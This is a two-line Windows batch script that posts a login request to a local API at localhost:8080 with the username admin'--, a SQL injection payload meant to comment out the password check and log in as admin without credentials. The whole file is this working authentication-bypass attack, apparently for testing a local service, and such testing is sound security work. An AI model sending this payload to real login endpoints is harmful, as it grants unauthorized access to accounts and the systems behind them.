@echo off
curl.exe -s -X POST http://localhost:8080/api/auth/login -H "Content-Type: application/json" -d "{\"username\":\"admin'--\",\"password\":\"anything\"}"
